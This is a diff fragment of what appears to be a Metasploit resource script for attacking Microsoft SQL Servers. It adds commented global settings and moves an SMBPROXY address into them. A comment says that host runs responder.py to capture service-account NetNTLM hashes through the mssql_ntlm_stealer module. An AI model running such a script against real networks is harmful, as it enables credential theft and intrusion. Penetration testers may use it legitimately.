@@ -7,10 +7,11 @@ spool /tmp/msf-sql.log
 #---------------------------------
 # Setup global vars - UPDATE THIS
 #---------------------------------
-setg USERNAME User1
-setg PASSWORD Password1
-setg USE_WINDOWS_AUTHENT true
-setg DOMAIN acme.com
+setg USERNAME User1             # domain user
+setg PASSWORD Password1         # domain user password
+setg DOMAIN acme.com            # domain user's domain
+setg USE_WINDOWS_AUTHENT true   # use windows authentication
+setg SMBPROXY 10.0.0.230        # ip for capturing the netntlm pw hash of service account - this server should run responder.py
 
 
 #---------------------------------
@@ -166,7 +167,6 @@ end
 # Capture service account NetNTLM hashes 
 #----------------------------------------
 use auxiliary/admin/mssql/mssql_ntlm_stealer
-set SMBPROXY 10.0.0.230
 set VERBOSE false
 set THREADS 50
 
